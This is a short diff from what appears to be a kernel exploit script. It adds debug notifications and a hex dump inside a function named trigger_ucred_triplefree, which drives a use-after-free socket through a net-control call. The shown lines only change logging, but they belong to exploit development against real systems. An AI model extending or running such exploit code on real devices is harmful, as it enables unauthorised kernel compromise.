@@ -1519,8 +1519,9 @@ function trigger_ucred_triplefree() {
     // قبل nc_call
     send_notification("[T] before_nc_call_clear");
     send_notification("[T] nc_clear_buf_ptr=" + nc_clear_buf);
-    send_notification("[T] nc_clear_buf_size=16");
+    send_notification("[T] nc_clear_buf_size=32");
     send_notification("[T] clear_queue_value=" + uaf_socket);
+    send_notification("[T] dump=" + hex_dump(nc_clear_buf, 32));
     nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
     send_notification("[T] after_nc_call_clear");
 
